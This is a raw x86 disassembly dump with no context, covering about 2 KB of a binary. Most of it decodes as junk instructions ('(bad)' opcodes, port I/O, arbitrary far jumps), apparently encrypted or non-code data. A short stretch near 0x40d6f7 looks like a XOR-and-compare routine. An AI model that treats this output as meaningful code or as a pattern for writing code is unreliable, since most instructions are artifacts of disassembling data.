  40d5f0:	arpl   WORD PTR [ebx],bx
  40d5f2:	mov    ebp,0x47209eac
  40d5f7:	dec    edi
  40d5f8:	mov    eax,ds:0xb6734ffb
  40d5fd:	in     eax,dx
  40d5fe:	outs   dx,DWORD PTR ds:[esi]
  40d5ff:	sbb    cl,0x74
  40d602:	call   0x6200:0xb39b35a9
  40d609:	sar    DWORD PTR [ecx],cl
  40d60b:	cmp    eax,DWORD PTR [ecx+ebx*2+0xc]
  40d60f:	out    dx,eax
  40d610:	mov    ebx,0x5ced0de6
  40d615:	(bad)  [esi+0x60]
  40d618:	shl    DWORD PTR [esi-0x1fd48ed4],0x3c
  40d61f:	mov    dl,BYTE PTR [edi+0x34]
  40d622:	inc    ebx
  40d623:	mul    al
  40d625:	xchg   DWORD PTR [esi],ebx
  40d627:	add    al,0x79
  40d629:	lea    ebx,[ecx+edx*2]
  40d62c:	idiv   DWORD PTR [ebx+edi*2]
  40d62f:	popf   
  40d630:	sahf   
  40d631:	or     bl,dl
  40d633:	add    al,BYTE PTR [ecx-0x7e4ded6c]
  40d639:	mul    bl
  40d63b:	mov    gs,WORD PTR [ebx+0xe]
  40d63e:	or     al,0x15
  40d640:	mov    dh,0xe0
  40d642:	(bad)  
  40d643:	out    0x1c,eax
  40d645:	loop   0x40d5d6
  40d647:	dec    ebp
  40d648:	ficom  WORD PTR [edx-0xc]
  40d64b:	and    eax,0xdd47fc1f
  40d650:	in     al,dx
  40d651:	test   al,0x7a
  40d653:	mov    esi,0x470d4ae9
  40d658:	inc    ecx
  40d659:	mov    cl,0x3d
  40d65b:	xadd   BYTE PTR [esi+0x45],bh
  40d65f:	jbe    0x40d6ac
  40d661:	xor    eax,0x42683531
  40d666:	ficom  DWORD PTR [ebx-0x20]
  40d669:	test   eax,0xdf49cf48
  40d66e:	ret    
  40d66f:	sti    
  40d670:	sahf   
  40d671:	scas   al,BYTE PTR es:[edi]
  40d672:	pop    ebx
  40d673:	push   ecx
  40d674:	xchg   ecx,eax
  40d675:	mov    ?,WORD PTR [esp+ebx*8-0x3478d452]
  40d67c:	mov    dl,0x2a
  40d67e:	(bad)  
  40d67f:	cmp    al,0xfb
  40d682:	loopne 0x40d63f
  40d684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d685:	fcmovne st,st(5)
  40d687:	call   0xa02b:0x8694e0f5
  40d68e:	je     0x40d6de
  40d690:	(bad)  
  40d692:	xor    eax,DWORD PTR [eax+0x60c4cb5b]
  40d698:	sub    edx,DWORD PTR [edx]
  40d69a:	adc    BYTE PTR ds:0x4ac63e7f,dh
  40d6a0:	icebp  
  40d6a1:	and    ebp,DWORD PTR es:[eax+edi*1+0x50a6f80a]
  40d6a9:	xlat   BYTE PTR ds:[ebx]
  40d6ab:	jmp    0x2277d4ec
  40d6b0:	fwait
  40d6b1:	jmp    0x40d63f
  40d6b3:	jno    0x40d718
  40d6b5:	xchg   edi,eax
  40d6b6:	ret    0xcf7
  40d6b9:	imul   esp,ebx,0xffffffcb
  40d6bc:	jb     0x40d667
  40d6be:	pop    ax
  40d6c0:	push   ebp
  40d6c1:	(bad)  
  40d6c2:	push   edi
  40d6c3:	jle    0x40d69f
  40d6c5:	jo     0x40d725
  40d6c7:	popf   
  40d6c8:	dec    ebp
  40d6c9:	sub    DWORD PTR [esi],edx
  40d6cb:	lahf   
  40d6cc:	clc    
  40d6cd:	pop    es
  40d6ce:	imul   eax,DWORD PTR [edx],0x28
  40d6d1:	sahf   
  40d6d2:	rcr    BYTE PTR [ecx],cl
  40d6d4:	rcl    BYTE PTR [esi-0x7b],1
  40d6d7:	dec    ebx
  40d6d8:	xor    eax,0x7a61aaf3
  40d6dd:	push   cs
  40d6de:	sub    al,0xc
  40d6e0:	(bad)  
  40d6e1:	push   esp
  40d6e2:	into   
  40d6e3:	add    al,dh
  40d6e5:	rcr    BYTE PTR [eax+0x292d31c9],0xa7
  40d6ec:	mov    dl,0xfe
  40d6ee:	sub    BYTE PTR [ecx+0x107d1d3a],cl
  40d6f4:	mov    WORD PTR [eax+0x3],?
  40d6f7:	xor    edx,ecx
  40d6f9:	mov    ecx,DWORD PTR [ebp+0x8]
  40d6fc:	lea    ecx,[edx+ecx*1+0x32729d]
  40d703:	cmp    ecx,eax
  40d705:	jne    0x40d129
  40d70b:	mov    ebx,esi
  40d70d:	jmp    0x40d717
  40d712:	mov    ebx,0x32729d
  40d717:	mov    eax,DWORD PTR [ebp-0x4]
  40d71a:	xor    eax,0x7510856
  40d71f:	add    eax,ebx
  40d721:	mov    DWORD PTR [ebp-0xc],eax
  40d724:	xor    ebx,ebx
  40d726:	lea    eax,[ebp-0x10]
  40d729:	add    ebx,DWORD PTR [eax]
  40d72b:	jmp    0x40d889
  40d730:	xchg   ebp,eax
  40d731:	pop    es
  40d732:	mov    ds:0xa5aabdfe,eax
  40d737:	cmp    eax,0xb6db83b1
  40d73c:	retf   
  40d73d:	pushf  
  40d73e:	nop
  40d73f:	xchg   edx,eax
  40d740:	add    DWORD PTR [eax+0x7f3f7e7e],eax
  40d746:	jle    0x40d7c6
  40d748:	cmc    
  40d749:	jno    0x40d6d2
  40d74b:	sar    DWORD PTR [edi],cl
  40d74d:	std    
  40d74e:	ins    BYTE PTR es:[edi],dx
  40d74f:	mov    bh,0x2
  40d751:	addr16 cli 
  40d753:	mov    ebx,0xe738cae8
  40d758:	stos   DWORD PTR es:[edi],eax
  40d759:	adc    dl,BYTE PTR [ecx-0x5bc3cacb]
  40d75f:	jl     0x40d7c7
  40d761:	pop    esi
  40d762:	and    eax,0xf9d2a595
  40d767:	adc    dl,bl
  40d769:	(bad)  
  40d76a:	int3   
  40d76b:	ss es call 0x2ff59b1c
  40d772:	pop    eax
  40d773:	jg     0x40d72e
  40d775:	cli    
  40d776:	das    
  40d777:	fwait
  40d778:	mov    eax,ds:0xa0844266
  40d77d:	jnp    0x40d7b9
  40d77f:	inc    esi
  40d780:	das    
  40d781:	sbb    eax,0x422bb423
  40d786:	cmp    BYTE PTR [ebx],dh
  40d788:	and    ebp,0x9a4daab4
  40d78e:	or     bl,BYTE PTR [eax+edi*4]
  40d791:	push   ebx
  40d792:	in     al,dx
  40d793:	xor    eax,0x5cbbd6a8
  40d798:	out    dx,eax
  40d799:	and    esi,edx
  40d79b:	mov    bl,0xdd
  40d79d:	int    0x30
  40d79f:	popa   
  40d7a0:	and    DWORD PTR [ecx-0x1b],ebp
  40d7a3:	test   dl,bl
  40d7a5:	inc    esi
  40d7a6:	inc    edi
  40d7a7:	sbb    BYTE PTR [edi],dl
  40d7a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7aa:	push   edx
  40d7ab:	mov    ah,0x3a
  40d7ad:	push   eax
  40d7ae:	mov    dl,0xd5
  40d7b0:	mov    cl,0x6c
  40d7b2:	xchg   ecx,eax
  40d7b3:	lea    edx,[eax-0x3f22fe2f]
  40d7b9:	push   edx
  40d7ba:	int    0x61
  40d7bc:	jge    0x40d783
  40d7be:	mov    ds:0xf5b14b37,eax
  40d7c3:	das    
  40d7c4:	adc    DWORD PTR [edx+0x2a538fa1],ebx
  40d7ca:	push   0x13098625
  40d7cf:	das    
  40d7d0:	out    dx,eax
  40d7d1:	fs loopne 0x40d80f
  40d7d4:	or     ah,BYTE PTR [ebx]
  40d7d6:	outs   dx,BYTE PTR ds:[esi]
  40d7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7d8:	nop
  40d7d9:	jge    0x40d772
  40d7db:	push   ebp
  40d7dc:	and    BYTE PTR [esi+ecx*8-0x2a],ah
  40d7e0:	fcomp  DWORD PTR [eax+0x37]
  40d7e3:	hlt    
  40d7e4:	mov    ebp,DWORD PTR [ebx-0x10df742f]
  40d7ea:	mov    ebp,0xe04d8a6c
  40d7ef:	gs hlt 
  40d7f1:	mov    eax,0xf1bb49e8
  40d7f6:	push   0x7c
  40d7f8:	jl     0x40d7df
  40d7fa:	adc    edx,DWORD PTR [edi+0x30]
  40d7fd:	je     0x40d807
  40d7ff:	and    eax,0x8038ebc
  40d804:	nop
  40d805:	lods   eax,DWORD PTR ds:[esi]
  40d806:	push   eax
  40d807:	inc    eax
  40d808:	imul   edx,edi,0xf0a05e18
  40d80e:	xor    ecx,DWORD PTR [ebx-0x4b]
  40d811:	test   cl,0x81
  40d814:	cmc    
  40d815:	out    0xd9,al
  40d817:	push   ss
  40d818:	add    al,0xd8
  40d81a:	pushf  
  40d81b:	inc    esp
  40d81c:	test   BYTE PTR [esi+0x39],bh
  40d81f:	inc    edx
  40d820:	mov    bh,0xd1
  40d822:	dec    ebx
  40d823:	ror    DWORD PTR ds:[ebp+0x229ba27b],1
  40d82a:	loopne 0x40d7b1
  40d82c:	test   eax,0x3d978784
  40d831:	cmp    al,0x69
  40d833:	rol    DWORD PTR [edx-0x247f21e8],cl
  40d839:	pushf  
  40d83a:	int3   
  40d83b:	pop    esi
  40d83c:	push   edx
  40d83d:	clc    
  40d83e:	push   ss
  40d83f:	ret    
  40d840:	arpl   WORD PTR [ebx+0x77],bx
  40d843:	(bad)  
  40d844:	fwait
  40d845:	test   DWORD PTR [ecx],edx
  40d847:	ret    0x6350
  40d84a:	mov    dh,0x29
  40d84c:	jp     0x40d83a
  40d84e:	sub    al,cl
  40d850:	mov    esp,0x393a8fad
  40d855:	push   edx
  40d856:	int    0x57
  40d858:	lahf   
  40d859:	mov    cl,0xa8
  40d85b:	rcl    DWORD PTR [ebx],0x94
  40d85e:	dec    ebx
  40d85f:	fnsave [esi-0x33]
  40d862:	pusha  
  40d863:	push   ss
  40d864:	fwait
  40d865:	adc    DWORD PTR [esi+esi*8+0x6d9f3423],esp
  40d86c:	cmp    eax,0x5a7b3556
  40d871:	jae    0x40d8b9
  40d873:	cmp    eax,0xf978daf8
  40d878:	sbb    BYTE PTR [eax],0x30
  40d87b:	pop    ss
  40d87c:	js     0x40d7fe
  40d87e:	test   al,0xae
  40d880:	mov    al,ds:0xc9a8599
  40d885:	adc    bh,BYTE PTR cs:[eax]
  40d888:	jbe    0x40d889
  40d88a:	shl    DWORD PTR [ebx],cl
  40d88c:	fucomi st,st(1)
  40d88e:	pop    ecx
  40d88f:	add    DWORD PTR [eax],eax
  40d891:	add    dh,dh
  40d893:	arpl   WORD PTR [ebp+esi*2+0x7d97c57d],dx
  40d89a:	imul   eax,DWORD PTR [edx],0x51
  40d89d:	mov    edx,DWORD PTR [ebp+0x4b]
  40d8a0:	mov    edi,0x7e81c28c
  40d8a5:	jle    0x40d8e6
  40d8a7:	jg     0x40d927
  40d8a9:	jle    0x40d878
  40d8ab:	lock sbb ecx,DWORD PTR [ebx-0x4086b083]
  40d8b2:	mov    ?,WORD PTR [edx+0x47]
  40d8b5:	sbb    edi,esp
  40d8b7:	int    0x17
  40d8b9:	jge    0x40d89c
  40d8bb:	fs xchg ebx,eax
  40d8bd:	jnp    0x40d8d6
  40d8bf:	sub    dh,BYTE PTR [edi]
  40d8c1:	iret   
  40d8c2:	pop    ebx
  40d8c3:	gs ss in al,dx
  40d8c6:	sti    
  40d8c7:	xchg   edi,eax
  40d8c8:	jmp    0x619d:0x386e7d19
  40d8cf:	icebp  
  40d8d0:	and    eax,0x6df24163
  40d8d5:	int    0x38
  40d8d7:	and    BYTE PTR [bp+di],bl
  40d8da:	jae    0x40d8de
  40d8dc:	dec    ebx
  40d8dd:	and    DWORD PTR [edi-0x5eca6896],eax
  40d8e3:	xchg   edi,esi
  40d8e5:	stos   DWORD PTR es:[edi],eax
  40d8e6:	test   eax,0x186bd89f
  40d8eb:	sbb    edx,DWORD PTR [ebp-0x95b0f5f]
  40d8f1:	mov    esp,0x289940cd
  40d8f6:	in     eax,dx
  40d8f7:	test   eax,0x238e36ac
  40d8fc:	repnz push edx
  40d8fe:	pop    esi
  40d8ff:	mov    ecx,0xdd33167a
  40d904:	lock test BYTE PTR [ecx-0x1b],bh
  40d908:	adc    cl,BYTE PTR [ebx-0x5ed8eb25]
  40d90e:	push   esi
  40d90f:	cmp    al,0x4
  40d911:	loop   0x40d8ff
  40d913:	sub    edi,DWORD PTR [esi-0x574b79ac]
  40d919:	mov    dl,0xdc
  40d91b:	sbb    al,ch
  40d91d:	sbb    eax,0xfb057a39
  40d922:	fadd   QWORD PTR [ecx-0x37]
  40d925:	or     DWORD PTR ss:[edx+0x397032a4],0xffffffe5
  40d92d:	cmp    esi,DWORD PTR [edx]
  40d92f:	ins    DWORD PTR es:[edi],dx
  40d930:	mov    ecx,0xc987ed13
  40d935:	adc    bl,BYTE PTR [esi-0x2e0fb409]
  40d93b:	cmp    DWORD PTR [edx-0x318a0bf0],eax
  40d941:	neg    DWORD PTR [eax+0x23bcda26]
  40d947:	push   esp
  40d948:	jmp    0x47795b23
  40d94d:	or     eax,0xd3902c7d
  40d952:	imul   BYTE PTR [edx+0x66]
  40d955:	push   eax
  40d956:	push   0xceed7eb4
  40d95b:	jbe    0x40d927
  40d95d:	sar    DWORD PTR [edx+0x4e],cl
  40d960:	jo     0x40d9cd
  40d962:	or     eax,0x8e7f3943
  40d967:	dec    ecx
  40d968:	xchg   ebp,eax
  40d969:	mov    DWORD PTR [eax+0x6c],eax
  40d96c:	or     bh,al
  40d96e:	out    0x74,eax
  40d970:	push   eax
  40d971:	popf   
  40d972:	xchg   esp,eax
  40d973:	xchg   DWORD PTR [esi],esp
  40d975:	push   0x64ee2530
  40d97a:	or     BYTE PTR [edi],ch
  40d97c:	jne    0x40d9a3
  40d97e:	inc    ecx
  40d97f:	fwait
  40d980:	rol    edi,0x73
  40d983:	cmp    bh,BYTE PTR [edi+0x22]
  40d986:	out    dx,eax
  40d987:	inc    edx
  40d988:	xor    eax,0x409d17c2
  40d98d:	fidiv  WORD PTR [eax+esi*8+0x3a]
  40d991:	mov    edx,0x35386724
  40d996:	je     0x40d949
  40d998:	test   DWORD PTR [eax+esi*2-0x3a],ecx
  40d99c:	add    esp,DWORD PTR ds:0x347211ea
  40d9a2:	and    al,0x21
  40d9a4:	retf   0x96fd
  40d9a7:	lods   eax,DWORD PTR ds:[esi]
  40d9a8:	jmp    0x792a:0x5d126861
  40d9af:	jb     0x40d98c
  40d9b1:	adc    bh,BYTE PTR [esi+0x18]
  40d9b4:	adc    DWORD PTR [ebx+0x42],edi
  40d9b7:	sbb    bl,bl
  40d9b9:	enter  0x11a5,0xe7
  40d9bd:	sub    dl,BYTE PTR [ebp*4+0x1bcc66a9]
  40d9c4:	aam    0x79
  40d9c6:	and    al,0xd6
  40d9c8:	pop    edi
  40d9c9:	xchg   esp,eax
  40d9ca:	jmp    0xd81b:0x7bcdbb3c
  40d9d1:	sbb    eax,0x5ebc6b91
  40d9d6:	xchg   ebp,eax
  40d9d8:	in     al,dx
  40d9d9:	ss cmc 
  40d9db:	sbb    DWORD PTR [edx-0x2e],edx
  40d9de:	enter  0x3360,0x1e
  40d9e2:	jp     0x40da06
  40d9e4:	pop    edx
  40d9e5:	adc    ah,0xcc
  40d9e8:	add    al,0xfe
  40d9ea:	jae    0x40da2f
  40d9ec:	jmp    0x40db4a
  40d9f1:	jae    0x40d9e7
  40d9f3:	aas    
  40d9f4:	mov    DWORD PTR [ecx-0x6573b2b3],esi
  40d9fa:	cmp    BYTE PTR [edx+0x77],bl
  40d9fd:	jno    0x40da51
  40d9ff:	push   es
  40da00:	push   ebp
  40da01:	add    DWORD PTR [edx+0x7f3f7e7e],0x7e
  40da08:	jle    0x40da6d
  40da0a:	mov    eax,0xfe0106af
  40da0f:	and    BYTE PTR [edx+0x2f],bh
  40da12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da13:	dec    esp
  40da14:	lods   al,BYTE PTR ds:[esi]
  40da15:	les    edx,FWORD PTR [ebx+0x56718735]
  40da1b:	rcr    BYTE PTR [ecx+0x12],1
  40da1e:	enter  0xaf88,0xdc
  40da22:	test   BYTE PTR [edx],bh
  40da24:	sbb    cl,0x6d
  40da27:	jge    0x40d9eb
  40da29:	adc    BYTE PTR es:[ecx+0x7aa4f972],0x1d
  40da31:	fnstcw WORD PTR [ecx-0x67fbe95a]
  40da37:	or     ah,BYTE PTR [esi-0x5]
  40da3a:	aad    0x63
  40da3c:	mov    ecx,0xa0059f53
  40da41:	xchg   ebx,eax
  40da42:	push   ebx
  40da43:	ror    BYTE PTR [ecx],1
  40da45:	add    al,al
  40da47:	jge    0x40d9cf
  40da49:	xchg   dh,al
  40da4b:	inc    esi
  40da4c:	neg    esp
  40da4e:	or     BYTE PTR [edi],ah
  40da50:	mov    edi,0x54be42b1
  40da55:	sub    eax,0xacde6100
  40da5a:	push   0x77db6278
  40da5f:	fist   DWORD PTR [eax+0x7174ad20]
  40da65:	daa    
  40da66:	add    DWORD PTR ds:0x11cd5067,ebx
  40da6c:	bound  eax,QWORD PTR [ebx+ebp*4-0x30]
  40da70:	test   BYTE PTR [esp+eax*4+0x70],0x24
  40da75:	sub    DWORD PTR [ecx+0x67],0x31
  40da79:	lahf   
  40da7a:	das    
  40da7b:	ins    BYTE PTR es:[edi],dx
  40da7c:	bound  edx,QWORD PTR [ecx+ebx*2-0x80]
  40da80:	cmc    
  40da81:	inc    esp
  40da82:	ss mov ah,0xa3
  40da85:	jecxz  0x40da47
  40da87:	push   esp
  40da88:	xor    bl,BYTE PTR [edi-0x1b]
  40da8b:	inc    edx
  40da8c:	daa    
  40da8d:	xchg   esi,eax
  40da8e:	repnz mov dl,0x42
  40da91:	hlt    
  40da92:	cmp    DWORD PTR [eax-0x9],edi
  40da95:	shl    DWORD PTR [ecx+0x28],cl
  40da98:	adc    al,0xa8
  40da9a:	or     esp,edi
  40da9c:	ja     0x40dad9
  40da9e:	loope  0x40da7f
  40daa0:	ret    0x1bb
  40daa3:	dec    eax
  40daa4:	paddq  mm0,QWORD PTR [ebx-0x254206cb]
  40daab:	aad    0x1f
  40daad:	sbb    al,0x7d
  40daaf:	pop    ebp
  40dab0:	mov    edx,edi
  40dab2:	pop    es
  40dab3:	nop
  40dab4:	add    al,0x1a
  40dab6:	add    BYTE PTR [esi+0x32],ah
  40dab9:	dec    ebp
  40daba:	jb     0x40da9a
  40dabc:	mov    eax,ds:0x54f0e76c
  40dac1:	lahf   
  40dac2:	jge    0x40db02
  40dac4:	loop   0x40db08
  40dac6:	cld    
  40dac7:	and    eax,0xc0b28725
  40dacc:	int3   
  40dacd:	js     0x40dace
  40dacf:	pop    ss
  40dad0:	xchg   edx,eax
  40dad1:	sbb    eax,0x9601043e
  40dad6:	das    
  40dad7:	or     eax,0x898fa017
  40dadc:	adc    bl,bh
  40dade:	les    edi,FWORD PTR [ecx+0x4e77d3ee]
  40dae4:	fidiv  WORD PTR [ebx-0x5b]
  40dae7:	arpl   WORD PTR [esi+edi*1+0x6a],bp
  40daeb:	and    al,0xc5
  40daed:	and    ecx,DWORD PTR [edi-0x5d]
  40daf0:	nop
  40daf1:	jecxz  0x40db31
  40daf3:	mov    bh,0x9b
  40daf5:	ds aam 0xa1
  40daf8:	int3   
  40daf9:	mov    ch,0x51
  40dafb:	xchg   edx,eax
  40dafc:	(bad)  
  40dafd:	(bad)  
  40daff:	fisttp DWORD PTR [edi]
  40db01:	sbb    BYTE PTR [eax+0x6d4ac5f7],bl
  40db07:	push   eax
  40db08:	add    BYTE PTR [esi+0x7a0078ed],dh
  40db0e:	or     eax,0x25270d0e
  40db13:	mov    ds:0x5ed6c64c,eax
  40db18:	mov    al,0x35
  40db1a:	dec    eax
  40db1b:	cmp    al,0x79
  40db1d:	xchg   ebx,eax
  40db1e:	or     DWORD PTR [ebp-0x3e424547],edi
  40db24:	inc    edx
  40db25:	inc    ebx
  40db26:	dec    eax
  40db27:	inc    ebp
  40db28:	mov    ebp,cr4
  40db2b:	retf   0x235a
  40db2e:	jne    0x40db68
  40db30:	ret    
  40db31:	pop    es
  40db32:	retf   
  40db33:	vandnps ymm5,ymm3,ymm0
  40db37:	add    cl,BYTE PTR [ecx+edx*2]
  40db3a:	add    ebx,DWORD PTR [ebx+0xc]
  40db3d:	sbb    al,0x7f
  40db3f:	cmp    al,0x6b
  40db41:	(bad)  
  40db42:	mov    edx,0xf55791e8
  40db47:	mov    ebx,0x5d398eea
  40db4c:	adc    BYTE PTR [edi],cl
  40db4e:	test   BYTE PTR [edx],dh
  40db50:	add    al,0x0
  40db52:	add    cl,ch
  40db54:	pop    ecx
  40db55:	add    DWORD PTR [eax],eax
  40db57:	add    BYTE PTR [ebp-0x54e36178],dl
  40db5d:	cmp    al,0xbd
  40db5f:	mov    ecx,0xd105ab5
  40db64:	inc    edx
  40db65:	sbb    bh,BYTE PTR [edx+eax*2]
  40db68:	inc    esp
  40db69:	cmp    DWORD PTR [esi+0x7e],0x3f
  40db6d:	jg     0x40dbed
  40db6f:	jle    0x40db70
  40db71:	ret    
  40db72:	push   cs
  40db73:	test   eax,0x3a3a2c58
  40db78:	popa   
  40db79:	inc    edi
  40db7a:	shr    esp,0x61
  40db7d:	(bad)  
  40db7e:	push   0xffffffe9
  40db80:	scas   al,BYTE PTR es:[edi]
  40db81:	mov    cl,0xc4
  40db83:	mov    esp,edx
  40db85:	pushf  
  40db86:	add    al,0x68
  40db88:	push   edi
  40db89:	fisub  DWORD PTR [esi+eiz*8-0x183220ed]
  40db90:	fstp   QWORD PTR [esi+0x7f0e1295]
  40db96:	push   es
  40db97:	out    dx,al
  40db98:	mov    edx,DWORD PTR [esi+0x21]
  40db9b:	push   edx
  40db9c:	mov    ch,dh
  40db9e:	aaa    
  40db9f:	add    al,0x1a
  40dba1:	xchg   ebp,eax
  40dba2:	lods   al,BYTE PTR ds:[esi]
  40dba3:	std    
  40dba4:	pop    eax
  40dba5:	inc    esp
  40dba6:	and    ecx,DWORD PTR [esi-0x2cf15452]
  40dbac:	and    bh,bh
  40dbae:	and    ecx,edi
  40dbb0:	fs mov ecx,0x6930d301
  40dbb6:	push   edx
  40dbb7:	inc    bp
  40dbb9:	retf   0x6a43
  40dbbc:	pop    esi
  40dbbd:	mov    WORD PTR [ebp+0xb],cs
  40dbc0:	push   esi
  40dbc1:	test   ch,dl
  40dbc3:	dec    eax
  40dbc4:	(bad)  
  40dbc5:	xchg   ebp,eax
  40dbc6:	in     al,dx
  40dbc7:	pusha  
  40dbc8:	sub    BYTE PTR [edx+0x4f1e55c7],dh
  40dbce:	pop    ds
  40dbcf:	xor    dl,0xa6
  40dbd2:	xor    edx,DWORD PTR [ebx-0x9274d84]
  40dbd8:	pop    es
  40dbd9:	das    
  40dbda:	stos   BYTE PTR es:[edi],al
  40dbdb:	adc    ch,ah
  40dbdd:	add    ch,BYTE PTR [edi]
  40dbdf:	cmp    DWORD PTR [edi],edx
  40dbe1:	popf   
  40dbe2:	pop    es
  40dbe3:	cmp    BYTE PTR [eax-0x139f4d4c],0xbb
  40dbea:	pop    ebp
  40dbeb:	mov    bh,0x33
  40dbed:	mov    al,0x20
  40dbef:	jne    0x40dc65
  40dbf1:	dec    ecx
  40dbf2:	pop    ebp
  40dbf3:	inc    esp
  40dbf4:	cmp    BYTE PTR [ebx+0x14b2ff63],bh
  40dbfa:	sti    
  40dbfb:	add    al,ch
  40dbfd:	dec    esp
  40dbfe:	jp     0x40dc61
  40dc00:	out    dx,eax
  40dc01:	pop    ds
  40dc02:	adc    cl,dh
  40dc04:	push   0x42c2589f
  40dc09:	push   eax
  40dc0a:	xchg   edx,eax
  40dc0b:	inc    esi
  40dc0c:	jne    0x40dc3a
  40dc0e:	mul    DWORD PTR [edi]
  40dc10:	fcomp  st(2)
  40dc12:	sbb    DWORD PTR [esi],0xe3e96172
  40dc18:	fst    QWORD PTR [eax+0xd59dc38]
  40dc1e:	adc    bl,BYTE PTR [edi+0x6d]
  40dc21:	adc    al,0x48
  40dc23:	loopne 0x40dc0e
  40dc25:	xchg   DWORD PTR [esi],ebx
  40dc27:	inc    ecx
  40dc28:	and    dh,BYTE PTR [ecx-0x58671fac]
  40dc2e:	xor    cl,dl
  40dc30:	adc    DWORD PTR [eax-0x40096928],edx
  40dc36:	aaa    
  40dc37:	(bad)  
  40dc38:	enter  0x7273,0x66
  40dc3c:	(bad)  
  40dc3d:	mov    DWORD PTR [edi],edx
  40dc3f:	ret    0x433
  40dc42:	jb     0x40dcc1
  40dc44:	cld    
  40dc45:	outs   dx,BYTE PTR ds:[esi]
  40dc46:	ins    BYTE PTR es:[edi],dx
  40dc47:	pop    ebx
  40dc48:	dec    eax
  40dc49:	mov    dl,0x21
  40dc4b:	xchg   BYTE PTR [ecx],bl
  40dc4d:	icebp  
  40dc4e:	stc    
  40dc4f:	(bad)  
  40dc50:	and    cl,ch
  40dc52:	adc    al,BYTE PTR [edi-0x54]
  40dc55:	pop    edx
  40dc56:	mov    edi,esi
  40dc58:	scas   al,BYTE PTR es:[edi]
  40dc59:	or     eax,0xa61b52fb
  40dc5e:	mov    BYTE PTR [ebx+0x2afe04ab],ch
  40dc64:	cmp    al,0x4c
  40dc66:	dec    esi
  40dc67:	or     al,0xa0
  40dc69:	mov    ch,0x6d
  40dc6b:	inc    esi
  40dc6c:	dec    ecx
  40dc6e:	dec    edx
  40dc6f:	mov    ch,BYTE PTR [eax+0x28]
  40dc72:	add    eax,0xaf5516c9
  40dc77:	jg     0x40dbf9
  40dc79:	xor    bl,BYTE PTR [esi*4-0x6c1126d0]
  40dc80:	sub    DWORD PTR [ebp+0x34967623],eax
  40dc86:	pop    es
  40dc87:	(bad)  
  40dc88:	adc    al,0x49
  40dc8a:	imul   eax,DWORD PTR [ebx-0x61f971a0],0xbba16f86
  40dc94:	and    eax,0x48ce986e
  40dc99:	cmp    al,0xf3
  40dc9b:	daa    
  40dc9c:	sbb    eax,0xf1abcda2
  40dca1:	sbb    al,0x44
  40dca4:	mov    DWORD PTR [ecx+0x49],edx
  40dca7:	mov    ds:0x5a0be935,al
  40dcac:	ret    0x9a4c
  40dcaf:	daa    
  40dcb0:	mov    eax,ds:0x159e992
  40dcb5:	add    BYTE PTR [eax],al
  40dcb7:	dec    eax
  40dcb8:	adc    eax,0xdc7bcafb
  40dcbd:	jns    0x40dc54
  40dcbf:	rcl    BYTE PTR ds:0xab5e3fe9,cl
  40dcc5:	add    BYTE PTR [edx+0x7e7e8505],dl
  40dccb:	aas    
  40dccc:	jg     0x40dd4c
  40dcce:	jle    0x40dc86
  40dcd0:	mov    ebp,0x482919dc
  40dcd5:	sbb    al,0xda
  40dcd7:	cmp    ch,BYTE PTR [ebx]
  40dcd9:	mov    edi,0x855ed38d
  40dcde:	lods   eax,DWORD PTR ds:[esi]
  40dcdf:	mov    BYTE PTR [ecx-0x5391dad1],dl
  40dce5:	gs loopne 0x40dcb0
  40dce8:	push   ebx
  40dce9:	test   eax,0xfdc4708d
  40dcee:	mov    al,0xe0
  40dcf0:	inc    esp
  40dcf1:	stos   DWORD PTR es:[edi],eax
  40dcf2:	bound  edi,QWORD PTR [esi]
  40dcf4:	test   al,0x70
  40dcf6:	(bad)  
  40dcf8:	push   0x43dbde6a
  40dcfd:	dec    ebx
  40dcfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcff:	or     eax,0x37674b58
  40dd04:	xchg   esi,eax
  40dd05:	ret    0x32a9
  40dd08:	test   BYTE PTR [ecx],ah
  40dd0a:	leave  
  40dd0b:	sbb    esp,DWORD PTR [edi-0x29ed2258]
  40dd11:	or     eax,0x848dfd86
  40dd16:	aad    0x56
  40dd18:	mov    esp,0xed9cad85
  40dd1d:	jg     0x40dd42
  40dd1f:	stos   DWORD PTR es:[edi],eax
  40dd20:	es cmp ebp,ecx
  40dd23:	push   ebp
  40dd24:	daa    
  40dd25:	ins    BYTE PTR es:[edi],dx
  40dd26:	out    dx,eax
  40dd27:	out    0x77,eax
  40dd29:	or     ecx,DWORD PTR cs:[eax+eiz*2-0x2beed772]
  40dd31:	xor    DWORD PTR [ecx+0x10],edx
  40dd34:	and    al,0xc8
  40dd36:	imul   ebp,DWORD PTR [edi],0x26
  40dd39:	jae    0x40dd1b
  40dd3b:	jae    0x40dcbd
  40dd3d:	mov    dl,BYTE PTR [edi]
  40dd3f:	out    0x3a,al
  40dd41:	jg     0x40dd9d
  40dd43:	ins    WORD PTR es:[edi],dx
  40dd45:	or     cl,0xbd
  40dd48:	jo     0x40dd35
  40dd4a:	xchg   edi,eax
  40dd4b:	inc    esi
  40dd4c:	mov    bh,0x54
  40dd4e:	fst    DWORD PTR cs:[ebx+0x47]
  40dd52:	sbb    al,0xf5
  40dd54:	dec    esi
  40dd55:	icebp  
  40dd56:	cld    
  40dd57:	ins    BYTE PTR es:[edi],dx
  40dd58:	sub    cl,BYTE PTR [esi+0x38]
  40dd5b:	xor    DWORD PTR [ecx],ecx
  40dd5d:	jp     0x40dcea
  40dd5f:	sub    ch,BYTE PTR [ecx-0x1e]
  40dd62:	mov    ecx,0xa92770ac
  40dd67:	pop    edx
  40dd68:	gs mov dl,0xc6
  40dd6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd6c:	pop    ebx
  40dd6d:	add    bl,BYTE PTR [edi-0xe]
  40dd70:	push   eax
  40dd71:	xor    eax,0x555d039
  40dd76:	shl    BYTE PTR [ebx-0x5f],0x87
  40dd7a:	mov    dl,0x78
  40dd7c:	aas    
  40dd7d:	inc    ebp
  40dd7e:	outs   dx,BYTE PTR ds:[esi]
  40dd7f:	js     0xe0fff6c8
  40dd85:	pop    ss
  40dd86:	jmp    0xbfe1a1df
  40dd8b:	mov    ch,0x6c
  40dd8d:	xchg   esp,eax
  40dd8e:	push   ds
  40dd8f:	scas   al,BYTE PTR es:[edi]
  40dd90:	sbb    al,0xee
  40dd92:	pushf  
  40dd93:	mov    ds:0xf2ae2596,al
